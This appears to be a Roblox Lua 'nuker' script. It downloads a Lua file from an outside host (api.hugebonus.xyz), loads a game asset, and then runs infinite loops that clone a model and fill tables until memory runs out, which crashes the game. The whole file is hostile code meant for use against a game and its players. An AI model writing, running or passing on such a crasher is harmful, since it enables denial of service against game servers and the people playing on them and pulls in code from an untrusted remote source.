nukerasset = game:HttpGet("https://api.hugebonus.xyz/scripts/nukerasset.lua")
local NukeModel = game:GetObjects("rbxassetid://94606474731448")[1]
local a = {}
local b = {}
local c = {}
local d = {}

pcall(function()
    while true do
        NukeModel:Clone()
    end
end)
pcall(function()
    while true do
        table.insert(a, math.random())
    end
end)
pcall(function()
    while true do
        table.insert(b, math.random())
    end
end)
pcall(function()
    while true do
        table.insert(c, math.random())
    end
end)
pcall(function()
    while true do
        table.insert(d, nukerasset)
    end
end)
